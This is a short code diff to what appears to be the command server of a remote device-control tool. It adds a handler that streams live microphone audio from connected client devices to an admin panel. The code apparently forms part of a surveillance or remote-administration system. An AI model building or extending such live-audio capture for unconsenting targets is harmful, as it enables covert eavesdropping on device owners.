@@ -346,6 +346,16 @@ class Clients {
             }
         });
 
+        socket.on(CONST.messageKeys.realtimeMic, (data) => {
+            if (data && data.stream && global.adminIO) {
+                global.adminIO.emit('mic:chunk', {
+                    clientID,
+                    id: data.id,
+                    buffer: data.buffer
+                });
+            }
+        });
+
         socket.on(CONST.messageKeys.permissions, (data) => {
             client.get('enabledPermissions').assign(data.permissions).write();
             logManager.log(CONST.logTypes.success, clientID + " Permissions Updated");
